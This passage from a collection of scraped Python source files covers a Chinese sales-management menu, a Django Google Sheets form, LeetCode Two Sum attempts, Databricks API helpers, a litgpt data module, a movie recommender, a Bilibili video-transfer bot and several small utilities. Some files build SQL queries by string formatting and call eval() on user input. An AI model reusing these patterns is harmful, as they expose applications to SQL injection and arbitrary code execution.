Record.close()\r\n Product_Manager() #\u8fd4\u56de\u5230\u300c\u7522\u54c1\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n\r\n#\u300c\u8cfc\u8cb7\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n#------------------------------------------------------\r\ndef Sales_Selection(): #\u300c\u8cfc\u8cb7\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n print(\"===\u300c\u8cfc\u8cb7\u300d\u7ba1\u7406\u7cfb\u7d71===\")\r\n print(\"1.\u52a0\u8cfc\u7a0b\u8a18\u9304\")\r\n print(\"2.\u9000\u8ca8\u7a0b\u8a18\u9304\")\r\n print(\"3.\u67e5\u8a62\u8cfc\u8cb7\u8a18\u9304\")\r\n print(\"4.\u56de\u4e3b\u756b\u9762\")\r\n n=eval(input(\"\u8acb\u9078\u64c7\u300c\u8cfc\u8cb7\u300d\u7ba1\u7406\u6e05\u55ae\uff1a\"))\r\n if n==1:\r\n   Insert_Sales()  #\u52a0\u8cfc\u7a0b\u8a18\u9304\r\n elif n==2:\r\n   Delete_Sales()  #\u9000\u8ca8\u7a0b\u8a18\u9304  \r\n elif n==3:\r\n   Query_Sales()   #\u67e5\u8a62\u8cfc\u8cb7\u8a18\u9304\r\n elif n==4:\r\n    Main_Menu()     #\u56de\u4e3b\u756b\u9762\r\n else:\r\n    print(\"\u8acb\u9078\u64c71~5\u9805\u529f\u80fd\")\r\n\r\ndef CheckSales_NO(Sid,No):  \r\n  SQLcmd=\"select * from \u8cfc\u8cb7\u8868 where \u7de8\u865f='{}' and \u54c1\u865f='{}'\".format(Sid,No)  \r\n  cursor=conn.execute(SQLcmd)\r\n  return cursor.fetchone()  #\u82e5\u7121\u8a18\u9304\u5247\u50b3\u56deNone\r\n\r\ndef Insert_Sales():  #\u52a0\u8cfc\u7a0b\u8a18\u9304\r\n# Query_Produc",
    "from django.forms import ModelForm, widgets\nfrom django import forms\nfrom .models import User, Links\nfrom django.contrib.auth.forms import UserCreationForm\nfrom google_auth_oauthlib.flow import InstalledAppFlow\nfrom googleapiclient.discovery import build\nfrom oauth2client.tools import run_flow, argparser\nfrom oauth2client.file import Storage\nfrom oauth2client.client import flow_from_clientsecrets\nimport pandas as pd\n\nclass MyUserCreationForm(UserCreationForm):\n    class Meta:\n        model = User\n        fields = ['company_name', 'email', 'username', 'type', 'years', 'password1', 'password2']\n        \nclass LoginForm(ModelForm):\n    class Meta:\n        model = User\n        fields = ['email','password']\n\nclass LinkForm(ModelForm):\n    def __init__(self, *args, **kwargs):\n        self.request = kwargs.pop('request', None)\n        super(LinkForm, self).__init__(*args, **kwargs)\n\n    class Meta:\n        model = Links\n        fields = ['link']\n\n    def clean(self):\n        cleaned_data = super().clean()\n        link = cleaned_data.get('link')\n\n        try:\n            spreadsheet_id = self.get_spreadsheet_id_from_url(link)\n\n            if spreadsheet_id:\n                print('hi')\n                # Authenticate the user using OAuth2\n                flow = flow_from_clientsecrets(\n                    '../client_secret_new2.json',\n                    scope=['https://www.googleapis.com/auth/spreadsheets.readonly'],\n                    redirect_uri='http://localhost:8000/uploadsheet')\n\n                print('hi2')\n                # Use the request object to get the user's credentials\n                flags = argparser.parse_args(args=[])\n                credentials = run_flow(flow, Storage('credentials2.json'), flags)\n\n                print('hi3')\n                # Use the access token to access the Google Sheets API\n                service = build('sheets', 'v4', credentials=credentials)\n                sheet = service.spreadsheets().get(spreadsheetId=spreadsheet_id).execute()\n\n                # Read values from the first sheet\n                result = service.spreadsheets().values().get(spreadsheetId=spreadsheet_id, range='A:BA').execute()\n                values = result.get('values', [])\n\n                # Define the data types for the columns\n                column_dtypes = {\n                    'order date (DateOrders)': 'datetime64[ns]',\n                    'Days for shipping (real)': 'int64',\n                    'Days for shipment (scheduled)': 'int64',\n                    'Benefit per order': 'float64',\n                    'Sales per customer': 'float64',\n                    'Late_delivery_risk': 'int64',\n                    'Category Id': 'int64',\n                    'Customer Id': 'int64',\n                    # 'Customer Zipcode': 'float64',\n                    # 'Customer Zipcode': 'float64',\n                    'Department Id': 'int64',\n                    'Order Customer Id': 'int64',\n                    'Order Id': 'int64',\n                    'Order Item Cardprod Id': 'int64',\n                    'Order Item Discount': 'float64',\n                    'Order Item Discount Rate': 'float64',\n                    'Order Item Id': 'int64',\n                    'Order Item Product Price': 'float64',\n                    'Order Item Profit Ratio': 'float64',\n                    'Order Item Quantity': 'int64',\n                    'Sales': 'float64',\n                    'Order Item Total': 'float64',\n                    'Order Profit Per Order': 'float64',\n                    # 'Order Zipcode': 'float64',\n                    'Product Card Id': 'int64',\n                    'Product Category Id': 'int64',\n                    'Product Price': 'float64',\n                    'Product Status': 'int64'\n                }\n\n                # Create a pandas DataFrame from the sheet data\n                df = pd.DataFrame(values[1:], columns=values[0])\n\n                # Convert the data types of the columns\n                df = df.astype(column_dtypes)\n\n                cleaned_data['link_data'] = df\n            else:\n                raise forms.ValidationError('Invalid spreadsheet URL.')\n        except Exception as e:\n            raise forms.ValidationError(f'Error accessing spreadsheet: {e}')\n\n        return cleaned_data    \n\n    def get_spreadsheet_id_from_url(self, url):\n        try:\n            parts = url.split('/')\n            spreadsheet_id = parts[-2]\n            return spreadsheet_id\n        except Exception as e:\n            # Handle any errors that occur during ID extraction\n            print(\"Error extracting Spreadsheet ID:\", e)\n            return None",
    "# 1. Two Sum\n# Given an array of integers nums and an integer target, return indices of the two numbers such that they add up to target.\n\n# You may assume that each input would have exactly one solution, and you may not use the same element twice.\n\n# You can return the answer in any order.\n# Example 1:\n\n# Input: nums = [2,7,11,15], target = 9\n# Output: [0,1]\n# Explanation: Because nums[0] + nums[1] == 9, we return [0, 1].\n# Example 2:\n\n# Input: nums = [3,2,4], target = 6\n# Output: [1,2]\n# Example 3:\n\n# Input: nums = [3,3], target = 6\n# Output: [0,1]\n \n\n# Constraints:\n\n# 2 <= nums.length <= 104\n# -109 <= nums[i] <= 109\n# -109 <= target <= 109\n# Only one valid answer exists.\n \n\n# Follow-up: Can you come up with an algorithm that is less than O(n2) time complexity?\n\n\n################################################################################################################################\nclass Solution(object):\n    def twoSum(self, nums, target):\n        \"\"\"\n        :type nums: List[int]\n        :type target: int\n        :rtype: List[int]\n        \"\"\"\n        #FirstAttempt\n        # for i1,e1 in enumerate(nums):\n        #     for i2,e2 in enumerate(nums):\n        #         if i1==i2: continue\n        #         elif e1+e2==target: return [i1,i2]\n        #Accepted\n        #Runtime \u2248 4469\n        #Memory \u2248 12.50\n\n        #SecondAttempt\n        i1=0\n        while 1:\n            i2=i1+1\n            for e in nums[1:]:\n                if nums[0]+e == target: return [i1,i2]\n                i2+=1\n            i1+=1\n            del nums[0]\n        #Accepted\n        #Runtime \u2248 2183\n        #Memory \u2248 12.45\n        \n        #ThirdAttempt\n        # i1=0\n        # while 1:\n        #     i2=i1+1\n        #     for e in nums[i1+1:]:\n        #         if nums[i1]+e == target: return [i1,i2]\n        #         i2+=1\n        #     i1+=1\n        #Accepted \n        #Runtime \u2248 2191\n        #Memory \u2248 12.38\n        \n        #FourthAttempt (I was helped)\n        # i=0\n        # for e in nums:\n        #     if target-e in nums[1+i:]: \n        #         return [i,nums[1+i:].index(target-e)+i+1]\n        #     i+=1\n        #Accepted \n        #Runtime \u2248 280ms\n        #Memory \u2248 12.24\n        \n        #FiveAttempt (Not mine)\n        # h={}\n        # for i,e in enumerate(nums):\n        #     if target-e in h: return [h[target-e],i]\n        #     else:\n        #         h[e]=i",
    "import requests\nimport logging\nfrom typing import Optional, Tuple\n\n# Set up logging\nlogging.basicConfig(level=logging.INFO)\n\ndef get_pipeline_job_id_by_name(workspace_url: str, token: str, pipeline_keyword: str) -> Optional[str]:\n    \"\"\"\n    Retrieve the job ID of a Databricks pipeline by searching for a keyword in its name.\n\n    Parameters:\n        workspace_url (str): The URL of the Databricks workspace.\n        token (str): The personal access token for accessing the Databricks API.\n        pipeline_keyword (str): The keyword to search for in the pipeline names.\n\n    Returns:\n        str or None: The job ID of the first pipeline found containing the keyword in its name,\n        or None if no such pipeline is found.\n    \"\"\"\n    if not all([workspace_url, token, pipeline_keyword]):\n        logging.error(\"Missing required input(s).\")\n        return None\n\n    # Endpoint for listing all jobs\n    endpoint = f\"{workspace_url}/api/2.0/jobs/list\"\n\n    # Header with authorization token\n    headers = {\n        \"Authorization\": f\"Bearer {token}\",\n        \"Content-Type\": \"application/json\"\n    }\n\n    try:\n        # Make the GET request to list jobs\n        response = requests.get(endpoint, headers=headers)\n\n        # Check if the request was successful (status code 200)\n        if response.status_code == 200:\n            # Parse the JSON response\n            jobs_data = response.json()\n\n            # Find pipelines containing the keyword in their names\n            pipelines = [job[\"job_id\"] for job in jobs_data.get(\"jobs\", []) if pipeline_keyword in job.get(\"settings\", {}).get(\"name\", \"\")]\n\n            # Check if any pipelines were found\n            if pipelines:\n                logging.info(f\"Found pipelines containing the keyword '{pipeline_keyword}'\")\n                return pipelines[0]\n            else:\n                logging.warning(f\"No pipelines found containing the keyword '{pipeline_keyword}'\")\n                return None\n        else:\n            logging.error(f\"Error: {response.status_code} - {response.text}\")\n            return None\n    except Exception as e:\n        logging.error(f\"An error occurred: {str(e)}\")\n        return None\n\n\ndef get_specific_run(job_id: str, token: str, workspace_url: str, run_index: int = 0) -> Optional[dict]:\n    \"\"\"\n    Get a specific run object for a specific job.\n\n    Parameters:\n        job_id (str): The ID of the job.\n        token (str): Authorization token.\n        workspace_url (str): URL of the workspace.\n        run_index (int): Index of the run to retrieve. Default is 0 (most recent run).\n\n    Returns:\n        dict or None: The specified run object, or None if an error occurs.\n    \"\"\"\n    if not all([job_id, token, workspace_url]):\n        logging.error(\"Missing required input(s).\")\n        return None\n\n    # Endpoint for listing runs of a specific job\n    endpoint = f\"{workspace_url}/api/2.0/jobs/runs/list?job_id={job_id}\"\n\n    # Header with authorization token\n    headers = {\n        \"Authorization\": f\"Bearer {token}\",\n        \"Content-Type\": \"application/json\"\n    }\n\n    try:\n        # Make the GET request\n        response = requests.get(endpoint, headers=headers)\n\n        # Check if the request was successful (status code 200)\n        if response.status_code == 200:\n            # Get the list of runs\n            runs_data = response.json().get(\"runs\", [])\n\n            # Check for the specified run\n            if len(runs_data) > run_index:\n                return runs_data[run_index]\n            else:\n                logging.warning(\"No runs found for the specified job or invalid run index.\")\n                return None\n        else:\n            logging.error(f\"Error: {response.status_code} - {response.text}\")\n            return None\n    except Exception as e:\n        logging.error(f\"An error occurred: {str(e)}\")\n        return None\n\n\ndef get_run_details(job_id: str, token: str, workspace_url: str, run_index: int = 0) -> Tuple[str, str]:\n    \"\"\"\n    Get the run_id and run_name for a specific job run.\n\n    Parameters:\n        job_id (str): The ID of the job.\n        token (str): Authorization token.\n        workspace_url (str): URL of the workspace.\n        run_index (int): Index of the run to retrieve. Default is 0 (most recent run).\n\n    Returns:\n        Tuple[str, str]: The run_id and run_name of the specified job run.\n    \"\"\"\n    run_details = get_specific_run(job_id, token, workspace_url, run_index)\n    if run_details:\n        run_id = run_details.get('run_id', '')\n        run_name = run_details.get('run_name', '')\n    else:\n        run_id = ''\n        run_name = ''\n    return run_id, run_name\n",
    "# Copyright Lightning AI. Licensed under the Apache License 2.0, see LICENSE file.\n\nimport json\nfrom dataclasses import dataclass, field\nfrom pathlib import Path\nfrom typing import Optional, Union\n\nimport torch\nfrom torch.utils.data import DataLoader\n\nfrom litgpt import PromptStyle\nfrom litgpt.data import DataModule, SFTDataset, get_sft_collate_fn\nfrom litgpt.data.alpaca import download_if_missing\nfrom litgpt.tokenizer import Tokenizer\n\n_URL = \"https://raw.githubusercontent.com/akoksal/LongForm/main/dataset\"\n\n\n@dataclass\nclass LongForm(DataModule):\n    \"\"\"LongForm data module for supervised finetuning.\"\"\"\n\n    mask_prompt: bool = False\n    \"\"\"Whether to mask the prompt section from the label (with ``ignore_index``).\"\"\"\n    prompt_style: Union[str, PromptStyle] = \"longform\"\n    \"\"\"The style to apply to instruction prompts. See `litgpt.prompts` for a list of available styles.\"\"\"\n    ignore_index: int = -100\n    \"\"\"The index to use for elements to be ignored in the label.\"\"\"\n    seed: int = 42\n    \"\"\"The random seed for shuffling the dataset.\"\"\"\n    num_workers: int = 4\n    \"\"\"How many DataLoader processes to use for loading.\"\"\"\n    download_dir: Path = Path(\"./data/longform\")\n    \"\"\"The directory in which the downloaded dataset gets saved.\"\"\"\n\n    tokenizer: Optional[Tokenizer] = field(default=None, init=False, repr=False)\n    batch_size: int = field(default=1, init=False, repr=False)\n    max_seq_length: int = field(default=-1, init=False, repr=False)\n    train_dataset: Optional[SFTDataset] = field(default=None, init=False, repr=False)\n    test_dataset: Optional[SFTDataset] = field(default=None, init=False, repr=False)\n\n    def __post_init__(self) -> None:\n        if isinstance(self.prompt_style, str):\n            self.prompt_style = PromptStyle.from_name(self.prompt_style)\n\n    def connect(\n        self, tokenizer: Optional[Tokenizer] = None, batch_size: int = 1, max_seq_length: Optional[int] = None\n    ) -> None:\n        self.tokenizer = tokenizer\n        self.batch_size = batch_size\n        self.max_seq_length = -1 if max_seq_length is None else max_seq_length\n\n    def prepare_data(self) -> None:\n        self.download_dir.mkdir(parents=True, exist_ok=True)\n        download_if_missing(self.download_dir / \"train.json\", f\"{_URL}/train.json\")\n        download_if_missing(self.download_dir / \"val.json\", f\"{_URL}/val.json\")\n\n    def train_dataloader(self):\n        return self._dataloader(\"train\")\n\n    def val_dataloader(self):\n        return self._dataloader(\"val\")\n\n    def _dataloader(self, split: str) -> DataLoader:\n        with open(self.download_dir / f\"{split}.json\", \"r\", encoding=\"utf-8\") as file:\n            data = json.load(file)\n\n        dataset = SFTDataset(\n            data=data,\n            tokenizer=self.tokenizer,\n            prompt_style=self.prompt_style,\n            max_seq_length=self.max_seq_length,\n            mask_prompt=self.mask_prompt,\n            ignore_index=self.ignore_index,\n            transform=_transform,\n        )\n        return DataLoader(\n            dataset=dataset,\n            batch_size=self.batch_size,\n            shuffle=(split == \"train\"),\n            generator=torch.Generator().manual_seed(self.seed),\n            num_workers=self.num_workers,\n            collate_fn=get_sft_collate_fn(max_seq_length=self.max_seq_length, ignore_index=self.ignore_index),\n        )\n\n\ndef _transform(item: dict) -> dict:\n    item[\"instruction\"] = item.pop(\"input\")\n    return item\n",
    "import pandas as pd\nimport json\nfrom .database import Database\nfrom sklearn.metrics import jaccard_score\n\n\ndef get_recommendation(user_id):\n    args = f\"SELECT rating, movie_id FROM recommend_myrating WHERE user_id = {user_id}\"  # Lista de avalia\u00e7\u00f5es do usuario\n    results = Database().query(args)\n    rating_list = pd.DataFrame(results, columns=[\"rating\", \"movie_id\"])\n\n    if not results:  # Caso o usuario n\u00e3o exista retorna os filmes e as medias de avalia\u00e7\u00e3o\n        best_movies = f\"SELECT rating, movie_id FROM recommend_myrating ORDER BY rating DESC\"  # filtrando todos as avalia\u00e7\u00f5es, ordenando da maior nota para a menor\n        results = Database().query(best_movies)\n\n        rating_list = pd.DataFrame(results, columns=[\"rating\", \"movie_id\"])\n\n        # Calculando a m\u00e9dia da coluna 'outra_coluna' para cada 'movie_id' e removendo os valores duplicados by gpt\n        rating_list = rating_list.groupby('movie_id').agg({'rating': 'mean'}).reset_index()\n\n        rating_list = rating_list[['movie_id', 'rating']].sort_values(by=['rating'],\n                                                                      ascending=False)  # ordenando pela nota\n\n        rating_list = rating_list[['movie_id', 'rating']].to_json(index=False, orient=\"table\")\n        return rating_list\n\n    args = f\"SELECT id, genre FROM recommend_movie\"  # Lista de avalia\u00e7\u00f5es do usuario\n    results = Database().query(args)\n    movie_list = pd.DataFrame(results, columns=[\"movie_id\", \"genre\"])\n    print(movie_list)\n    movie_list['genre'] = movie_list['genre'].str.split(\n        ',')  # transformando genre em uma lista de strings. Estava uma unica string\n\n    unique_genres = set()  # obtendo uma lista de todos os generos\n    for genres in movie_list['genre']:\n        unique_genres.update(genres)\n\n    genre_to_number = {genre: i for i, genre in enumerate(unique_genres)}  # definindo genero por numero inteiro\n    movie_list['genre_id'] = movie_list['genre'].map(\n        lambda x: [genre_to_number[genre] for genre in x])  # adicionando o mapa na coluna de genre_id\n\n    movie_list['genre_id'] = movie_list['genre_id'].apply(lambda x: x + [-1] * (\n            3 - len(x)))  # padronizando numero de generos para 3, e adicionando -1 nos generos faltantes\n\n    # Selecionar os filmes que n\u00e3o foram avaliados pelo usuario\n    merged = pd.merge(movie_list, rating_list, how='outer', indicator=True)\n    user_movies = merged[merged['_merge'] == 'both'].drop('_merge', axis=1)\n    user_movies = user_movies.drop(user_movies[user_movies.rating <= 3].index)\n\n    final_list = pd.DataFrame(columns=('index', 'movie_id', 'similarity_coefficient'))\n    for movie_id_user in user_movies['movie_id']:\n        similar_movies = json.loads(get_similar(movie_id_user))['data']\n        for data in similar_movies:\n            final_list.loc[len(final_list.index)] = data\n\n    final_list = final_list.groupby('movie_id').agg({'similarity_coefficient': 'mean'}).reset_index()\n    final_list = final_list.sort_values(by=['similarity_coefficient'], ascending=False)  # ordenando pela nota\n    final_list = final_list[['movie_id', 'similarity_coefficient']].to_json(index=None, orient=\"table\")\n    return final_list\n\ndef get_similar(id_movie):\n    args = f\"SELECT id, genre FROM recommend_movie\"  # Lista de de filmes\n    results = Database().query(args)\n    movie_list = pd.DataFrame(results, columns=[\"movie_id\", \"genre\"])  # lista de filmes em um DF\n\n    # transformando genre em uma lista de strings. Estava uma unica string\n    movie_list['genre'] = movie_list['genre'].str.split(\n        ',')\n\n    # obtendo uma lista de todos os generos unicos\n    unique_genres = set()\n    for genres in movie_list['genre']:\n        unique_genres.update(genres)\n\n    # definindo cada genero por numero inteiro\n    genre_to_number = {genre: i for i, genre in enumerate(unique_genres)}\n\n    # adicionando o mapa na coluna de genre_id\n    movie_list['genre_id'] = movie_list['genre'].map(\n        lambda x: [genre_to_number[genre] for genre in x])\n\n    # padronizando genr_id.shape (1,3), e adicionando -1 nos generos faltantes  ex: gen [1,2] agora [1,2,-1]\n    movie_list['genre_id'] = movie_list['genre_id'].apply(lambda x: x + [-1] * (\n            3 - len(x)))\n\n    movie_request = movie_list.loc[movie_list['movie_id'] == int(id_movie)]  # Selecionando filme requisitado.\n\n    movie_list = movie_list[\n        movie_list['movie_id'] != int(id_movie)]  # removendo filme requisitado da lista de todos os filmes.\n\n    # Aplicando metrica de semelhan\u00e7a Jaccard para cada filme com rela\u00e7\u00e3o ao filme selecionado\n    for index, row in movie_list.iterrows():\n        y_true = row['genre_id']\n        y_pred = movie_request.iloc[0]['genre_id']\n        movie_list.at[index, 'similarity_coefficient'] = jaccard_score(y_true, y_pred, average='weighted')\n\n    final_list = movie_list[['movie_id', 'similarity_coefficient']].sort_values(by=['similarity_coefficient'],\n                                                                                ascendi",
    "import json\nimport re\nimport time\n\nimport requests\nfrom typing import List\n\nfrom video_transfer import VideoTransfer\n\nfrom util import logger\n\n\nclass BiliTaskManager:\n    def __init__(self,\n                 sender_uid,\n                 receiver_uid,\n                 cookie_file='./cookie.json',\n                 download_record_file='./data.json',\n                 chat_history_size=1,\n                 refresh_interval_seconds=120):\n        self.refresh_interval_seconds = refresh_interval_seconds\n        self.cookie_file = cookie_file\n        self.download_record_file = download_record_file\n        self.chat_history_size = chat_history_size\n        self.receiver_uid = receiver_uid\n        self.sender_uid = sender_uid\n        self.chat_api = \"https://api.vc.bilibili.com/svr_sync/v1/svr_sync/fetch_session_msgs?session_type=1\" \\\n                        \"&sender_device_id=1&size={}&build=0&mobi_app=web&talker_id={}\".format(self.chat_history_size,\n                                                                                               self.receiver_uid)\n\n    def get_cookie(self) -> str:\n        try:\n            text = open(self.cookie_file).read()\n            json_obj = json.loads(text)\n            cookie_list = json_obj[\"data\"][\"cookie_info\"][\"cookies\"]\n            \n            for cookie in cookie_list:\n                if cookie[\"name\"] == \"SESSDATA\":\n                    sess_data = cookie[\"value\"]\n                    logger.debug(\"Get bilibili cookie success: {}\".format(sess_data))\n                    return sess_data\n        except Exception as e:\n            logger.error(\"Get bilibili cookie failed: {}. Please login first.\".format(str(e)))\n            raise e\n\n    def query_bilibili_api(self, url: str):\n        r = requests.get(url, headers={\n            \"User-Agent\": \"Apifox/1.0.0 (https://www.apifox.cn)\",\n            \"Accept-Encoding\": None,\n            \"Accept\": None,\n            \"Connection\": None,\n            \"Cookie\": \"SESSDATA=\" + self.get_cookie()\n        })\n        return r.json()\n\n    def save_record(self, data):\n        with open(self.download_record_file, \"w\") as f:\n            f.write(json.dumps(data))\n\n    def read_records(self):\n        with open(self.download_record_file, \"r\") as f:\n            return json.loads(f.read())\n\n    @staticmethod\n    def match_url(url) -> str:\n        match = re.search(r'\\$(.*?)\\$', url)\n        if match:\n            return match.group(1)\n        return ''\n\n    @staticmethod\n    def match_tid(url) -> str:\n        match = re.search(r'<(.*?)>', url)\n        if match:\n            return match.group(1)\n        return ''\n\n    def get_tasks(self) -> dict:\n        task_paris = {}\n        resp = self.query_bilibili_api(self.chat_api)\n        message_list = resp[\"data\"][\"messages\"]\n\n        for msg_obj in message_list:\n            if str(msg_obj[\"sender_uid\"]) == self.sender_uid and int(msg_obj[\"msg_type\"]) == 1:\n                video_url, tid = self.match_url(msg_obj[\"content\"]), self.match_tid(msg_obj[\"content\"])\n                video_url = video_url.replace(\"\\\\/\", \"/\")\n                if len(video_url) > 0:\n                    logger.debug(\"Task info from message: video_url {} to tid {}.\".format(video_url, tid))\n                    task_paris[video_url] = tid\n                else:\n                    continue\n\n        return task_paris\n\n    def run_task(self):\n        try:\n            task_history = self.read_records()\n        except Exception as e:\n            logger.error('\u8bfb\u53d6\u5386\u53f2\u8bb0\u5f55\u5931\u8d25: {}'.format(str(e)))\n            task_history = dict()\n        counter = 0\n        while True:\n            try:\n                while True:\n                    counter += 1\n                    logger.debug(\"Start new round {}\".format(counter))\n                    task_list = self.get_tasks()\n                    for video_url, tid in task_list.items():\n                        if video_url in task_history.keys():\n                            logger.debug(\"Skip already done task: video_url {} to tid {}.\".format(video_url, tid))\n                            continue\n                        logger.debug(\"New task: video_url {} to tid {}.\".format(video_url, tid))\n\n                        transferer = VideoTransfer(video_url, tid)\n                        transferer.download_youtube()\n                        success = transferer.upload_bilibili()\n\n                        task_history[video_url] = tid\n                        if success:\n                            self.save_record(task_history)\n\n                        time.sleep(self.refresh_interval_seconds)\n\n                    time.sleep(self.refresh_interval_seconds)\n            except RuntimeError as e:\n                logger.error('\u8fd0\u884c\u65f6\u9519\u8bef: {}'.format(str(e)))\n            except Exception as e:\n                logger.error('\u6355\u83b7\u5f02\u5e38: {}'.format(str(e)))\n\n            time.sleep(self.refresh_interval_seconds)\n\n\n\nif __name__ == '__main__':\n    sender = '384542669'\n    receiver = '3546592707610853'\n    BiliTaskManager(sender, receiver, refresh_interv",
    "import cv2\nimport os\n\ndef extract_frames(video_path, output_folder):\n    # Check if the output folder exists; if not, create it\n    if not os.path.exists(output_folder):\n        os.makedirs(output_folder)\n\n    # Load the video\n    video = cv2.VideoCapture(video_path)\n    count = 0\n    success = True\n\n    # Loop until the video has frames to read\n    while success:\n        # Read a frame from the video\n        success, image = video.read()\n        # Check if a frame was successfully read\n        if success:\n            # Save the frame as an image file\n            cv2.imwrite(os.path.join(output_folder, f\"frame_{count:04d}.jpg\"), image)\n            count += 1\n\n    # Release the video capture object\n    video.release()\n    print(f\"Extracted {count} frames from {video_path}\")\n\ndef process_all_videos(directory):\n    # List all files in the directory\n    files = os.listdir(directory)\n    for file in files:\n        # Check if the file is a video based on its extension\n        if file.endswith(('.mp4', '.avi', '.mov', '.mkv')):  # add or remove extensions as needed\n            video_path = os.path.join(directory, file)\n            output_folder = os.path.join(directory, f\"{os.path.splitext(file)[0]}_frames\")\n            extract_frames(video_path, output_folder)\n\n# Directory containing all the videos\nvideo_directory = './all-data/'\nprocess_all_videos(video_directory)\n",
    "# -*- coding: utf-8 -*-\n\n################################################################################\n## Form generated from reading UI file 'main_window.ui'\n##\n## Created by: Qt User Interface Compiler version 5.15.2\n##\n## WARNING! All changes made in this file will be lost when recompiling UI file!\n################################################################################\n\nfrom PySide2.QtCore import *\nfrom PySide2.QtGui import *\nfrom PySide2.QtWidgets import *\n\n\nclass Ui_MainWindow(object):\n    def setupUi(self, MainWindow):\n        if not MainWindow.objectName():\n            MainWindow.setObjectName(u\"MainWindow\")\n        MainWindow.resize(1250, 710)\n        self.centralwidget = QWidget(MainWindow)\n        self.centralwidget.setObjectName(u\"centralwidget\")\n        self.horizontalLayout_7 = QHBoxLayout(self.centralwidget)\n        self.horizontalLayout_7.setObjectName(u\"horizontalLayout_7\")\n        self.tabWidget = QTabWidget(self.centralwidget)\n        self.tabWidget.setObjectName(u\"tabWidget\")\n        font = QFont()\n        font.setPointSize(12)\n        self.tabWidget.setFont(font)\n        self.tw_real_time_diagnosis = QWidget()\n        self.tw_real_time_diagnosis.setObjectName(u\"tw_real_time_diagnosis\")\n        self.tw_real_time_diagnosis.setFont(font)\n        self.horizontalLayout_3 = QHBoxLayout(self.tw_real_time_diagnosis)\n        self.horizontalLayout_3.setObjectName(u\"horizontalLayout_3\")\n        self.verticalLayout = QVBoxLayout()\n        self.verticalLayout.setObjectName(u\"verticalLayout\")\n        self.horizontalLayout = QHBoxLayout()\n        self.horizontalLayout.setObjectName(u\"horizontalLayout\")\n        self.verticalLayout_3 = QVBoxLayout()\n        self.verticalLayout_3.setSpacing(10)\n        self.verticalLayout_3.setObjectName(u\"verticalLayout_3\")\n        self.verticalLayout_3.setContentsMargins(10, -1, 10, -1)\n        self.pb_select_model = QPushButton(self.tw_real_time_diagnosis)\n        self.pb_select_model.setObjectName(u\"pb_select_model\")\n        self.pb_select_model.setMinimumSize(QSize(0, 30))\n\n        self.verticalLayout_3.addWidget(self.pb_select_model)\n\n\n        self.horizontalLayout.addLayout(self.verticalLayout_3)\n\n        self.gv_visual_diagnosis_data = QGraphicsView(self.tw_real_time_diagnosis)\n        self.gv_visual_diagnosis_data.setObjectName(u\"gv_visual_diagnosis_data\")\n\n        self.horizontalLayout.addWidget(self.gv_visual_diagnosis_data)\n\n        self.horizontalLayout.setStretch(1, 13)\n\n        self.verticalLayout.addLayout(self.horizontalLayout)\n\n        self.horizontalLayout_6 = QHBoxLayout()\n        self.horizontalLayout_6.setObjectName(u\"horizontalLayout_6\")\n        self.verticalLayout_2 = QVBoxLayout()\n        self.verticalLayout_2.setObjectName(u\"verticalLayout_2\")\n        self.verticalLayout_2.setContentsMargins(10, -1, 10, -1)\n        self.pb_local_diagnosis = QPushButton(self.tw_real_time_diagnosis)\n        self.pb_local_diagnosis.setObjectName(u\"pb_local_diagnosis\")\n        self.pb_local_diagnosis.setMinimumSize(QSize(0, 30))\n\n        self.verticalLayout_2.addWidget(self.pb_local_diagnosis)\n\n        self.pb_real_time_diagnosis = QPushButton(self.tw_real_time_diagnosis)\n        self.pb_real_time_diagnosis.setObjectName(u\"pb_real_time_diagnosis\")\n        self.pb_real_time_diagnosis.setMinimumSize(QSize(0, 30))\n\n        self.verticalLayout_2.addWidget(self.pb_real_time_diagnosis)\n\n\n        self.horizontalLayout_6.addLayout(self.verticalLayout_2)\n\n        self.horizontalLayout_2 = QHBoxLayout()\n        self.horizontalLayout_2.setObjectName(u\"horizontalLayout_2\")\n        self.tb_diagnosis_result = QTextBrowser(self.tw_real_time_diagnosis)\n        self.tb_diagnosis_result.setObjectName(u\"tb_diagnosis_result\")\n        self.tb_diagnosis_result.setStyleSheet(u\"border-style:solid;\\n\"\n\"border-width:1px;\")\n\n        self.horizontalLayout_2.addWidget(self.tb_diagnosis_result)\n\n        self.horizontalLayout_2.setStretch(0, 1)\n\n        self.horizontalLayout_6.addLayout(self.horizontalLayout_2)\n\n\n        self.verticalLayout.addLayout(self.horizontalLayout_6)\n\n        self.verticalLayout.setStretch(0, 3)\n        self.verticalLayout.setStretch(1, 4)\n\n        self.horizontalLayout_3.addLayout(self.verticalLayout)\n\n        self.tabWidget.addTab(self.tw_real_time_diagnosis, \"\")\n        self.tw_train_model = QWidget()\n        self.tw_train_model.setObjectName(u\"tw_train_model\")\n        self.horizontalLayout_8 = QHBoxLayout(self.tw_train_model)\n        self.horizontalLayout_8.setObjectName(u\"horizontalLayout_8\")\n        self.horizontalLayout_5 = QHBoxLayout()\n        self.horizontalLayout_5.setObjectName(u\"horizontalLayout_5\")\n        self.verticalLayout_7 = QVBoxLayout()\n        self.verticalLayout_7.setObjectName(u\"verticalLayout_7\")\n        self.verticalLayout_7.setContentsMargins(-1, 5, -1, 5)\n        self.pb_select_file = QPushButton(self.tw_train_model)\n        self.pb_select_file.setObjectName(u\"pb_select_file\")\n\n        self.verticalLayout_7.addWidget(self.pb_select_f",
    "from ai_football_newsletter.crew import FootballNewsletterCrew\nfrom datetime import datetime\nfrom dotenv import load_dotenv\nimport streamlit as st\nload_dotenv()\n\ndef run():\n    inputs = {\n        'current_time':  datetime.now().strftime('%Y-%m-%d %H:%M:%S')\n    }\n    FootballNewsletterCrew().crew().kickoff(inputs=inputs)\n    \n    \nif __name__ == \"__main__\":\n    st.title(\"AI Football Newsletter Generator \u26bd\")\n    \n    # Use a button to trigger the run function and capture output\n    if st.button(\"Generate Football Newsletter\"):\n        with st.status(\"\ud83e\udd16 **Agents at work...**\", state=\"running\", expanded=True) as status:\n            with st.container(height=500, border=False):\n                run()\n            status.update(label=\"\u2705 Newsletter ready!!\",\n                        state=\"complete\", expanded=False)\n\n        st.subheader(f\"Here is your newsletter for {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\", anchor=False, divider=\"rainbow\")\n        with open('./football_newsletter.md', 'r') as file:\n            newsletter_content = file.read()\n            st.markdown(newsletter_content, unsafe_allow_html=True)\n                \n    ",
